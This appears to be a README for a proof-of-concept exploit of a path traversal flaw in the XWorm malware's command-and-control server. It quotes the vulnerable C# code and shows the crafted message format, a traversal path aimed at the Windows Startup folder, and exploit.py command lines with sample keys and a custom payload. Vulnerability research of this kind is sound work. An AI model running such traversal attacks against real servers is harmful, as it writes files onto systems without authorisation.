# XWorm C2 Path Traversal Vulnerability

## Affected Versions

**Vulnerable:**
- XWorm v7.2 and earlier 

## What is Vulnerable

The XWorm C2 server accepts Recovery messages from any connected client without requiring the C2 to first request the data, and uses the client-supplied HWID directly in file path construction without validation, allowing path traversal to write files anywhere on the C2 filesystem.

When a client sends recovery data (stolen credentials, browser data, etc.), the C2 server uses the client's HWID (Hardware ID) to construct a file path. This HWID is not validated, allowing path traversal sequences like `..\..\..` to write files outside the intended directory. The C2 processes these Recovery messages immediately upon receipt without any authentication or validation that the client was actually asked to send this data.

**Vulnerable code location:** `Messages.cs` line 577

```csharp
string text4 = Path.Combine(Application.StartupPath, "ClientsFolder", array[1], "Recovery");
File.WriteAllText(text4 + "\\FileZilla_" + DateAndTime.Now.ToString("MM-dd-yyyy HH-mm-ss-fff") + ".txt", text5);
```

The `array[1]` parameter is the HWID sent by the client. It goes directly into `Path.Combine()` without any validation. Since `Path.Combine()` doesn't prevent traversal sequences, an attacker can escape the `ClientsFolder` directory and write files to arbitrary locations on the C2 server's filesystem.

## How the Exploit Works

The exploit connects to the XWorm C2 server and sends a crafted Recovery message with a malicious HWID containing path traversal sequences. The C2 server processes this message and writes the provided content to a file at the traversed location.

**Message format:**
```
Recovery<SEPARATOR>HWID<SEPARATOR>TYPE<SEPARATOR>CONTENT
```

**Example traversal HWID:**
```
..\..\..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

This traversal goes up from the normal path:
```
C:\Users\User\Downloads\XWorm V6.4\ClientsFolder\<HWID>\Recovery\
```

To reach:
```
C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Recovery\
```

The exploit requires the C2's configuration values (AES key, separator, mutex) which can be extracted from a captured XWorm sample by analyzing its `Settings.cs` file.

## Limitations

This vulnerability has significant limitations that prevent direct remote code execution:

1. **Hardcoded subfolder:** The C2 always appends `\Recovery\` to the path. You cannot write directly to a target folder - files always end up in a `Recovery` subdirectory.

2. **Hardcoded filename:** Files are named `FileZilla_<timestamp>.txt`. You cannot control the filename.

3. **Hardcoded extension:** All files get a `.txt` extension. You cannot write `.bat`, `.exe`, or other executable extensions directly.

## Using the Exploit

**Prerequisites:**
```bash
pip install pycryptodome
```

**Get configuration values:**

You need three values from the XWorm sample's `Settings.cs` file:
- `Settings.KEY` - Base64-encoded AES key
- `Settings.SPL` - Base64-encoded message separator  
- `Settings.Mutex` - Mutex string

**Test the vulnerability:**
```bash
python exploit.py <C2_IP> <C2_PORT> \
  --key "<BASE64_KEY>" \
  --spl "<BASE64_SPL>" \
  --mutex "<MUTEX>" \
  --test
```

This writes a test file. Check the C2 directory for `VULN_TEST\Recovery\FileZilla_*.txt` outside `ClientsFolder` to confirm the vulnerability exists.

**Run the exploit:**
```bash
python exploit.py <C2_IP> <C2_PORT> \
  --key "<BASE64_KEY>" \
  --spl "<BASE64_SPL>" \
  --mutex "<MUTEX>" \
  --exploit \
  --path "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" \
  --depth 4
```

**Parameters:**
- `--path`: Target directory path (relative from user directory)
- `--depth`: Number of `..` traversals needed (default: 4)
  - Depth depends on C2 installation location
  - From `C:\Users\User\Downloads\XWorm V6.4\ClientsFolder\<HWID>\Recovery\` use depth 4
  - From `C:\XWorm\ClientsFolder\<HWID>\Recovery\` use depth 3
  - Test with `--test` first to determine correct depth

**With custom payload:**
```bash
python exploit.py 192.168.1.100 5552 \
  --key "Njz2LrOsHpe83Y8FmEzXSw==" \
  --spl "jlUp/GaKjux6FAA4VNQ6Eg==" \
  --mutex "bIqDjMjopgCoADn2" \
  --exploit \
  --path "Users\Public\Desktop" \
  --depth 5 \
  --payload payload.txt
```

The file will be written to: `<target_path>\Recovery\FileZilla_<timestamp>.txt`
